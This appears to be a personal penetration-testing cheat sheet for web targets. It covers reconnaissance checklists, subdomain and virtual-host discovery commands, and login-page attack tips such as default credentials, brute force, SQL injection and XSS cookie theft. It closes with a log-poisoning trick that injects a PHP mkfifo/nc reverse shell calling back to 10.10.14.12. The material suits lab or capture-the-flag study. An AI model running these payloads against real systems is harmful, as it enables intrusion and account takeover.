## Checklist

- Whatweb
- Subdomains
- Checkout what the web display
- Read entire pages. Enumerate for emails, names, user info etc.
- Directory discovery
- Enum the interface, version of CMS? Server installation page?
- Potential vulnerability? LFI, RFI, XEE, Upload?
- Default web server page, version information
- View source code
    - Hidden Values
    - Developer Remarks
    - Extraneous Code
    - Passwords        
- Robots.txt
- Web scanning
## HTTPs certification

	Might have username

## Script to preview the website from IP in html

Create a list of the IP and Extract PNG

	for ip in $(cat web-ip.txt | grep 80 | grep -v "Nmap" |
	
	awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done

Make it HTML pngtohtml.sh

	#!/bin/bash
	# Bash script to examine the scan results through HTML.
	echo "<HTML><BODY><BR>" > web.html
	ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> w
	eb.html
	echo "</BODY></HTML>" >> web.html

## Redirecting webpage automatically?

- noredirect plugin
## Login page

- View source code
- Use default password
- Brute force directory first (sometime you don't need to login to pwn the machine)
- Search credential by bruteforce directory
- bruteforce credential
- Search credential in other service port
- Enumeration for the credential
- Register first
- SQL injection
- XSS can be used to get the admin cookie
- Bruteforce session cookie
## Find Subdomains
	crt.sh

	subfinder -d [domain]

	assetfinder [domain]

	amass enum -d [domain]

	gowitness file -f [domains file] -P [directory to save to] --no-http

	theharvester -d [domain] -b [data source, ex. google] -f [output] -l [length]
	
	wfuzz -c --hw 977 -u [host] -H "Host: FUZZ.[host]" -w [wordlist]
	nslookup --type=NS [domain]
	
	ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u [host] -H "Host: FUZZ.[host]" -fs 20637 -t 100
## Find Virtual Hosts
	fierce -dns [host]
## Identify WAF (Web Application Firewall)

	wafw00f
## Find version vulnerability?

- Google
## Password?

When presented with an enter credentials page, the first thing I try is common credentials (admin/admin, admin/password).

If that doesn’t work out, I look for default credentials online that are specific to the technology. Lastly, I use a password cracker if all else fails.

## Log poisoning

From LFI to RCE

If you get local file inclusion for log, you might be able to poison the log.

Change user agent to the following by intercept in burp to get reverse shell

	nc -lnvp 4444
	<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f') ?>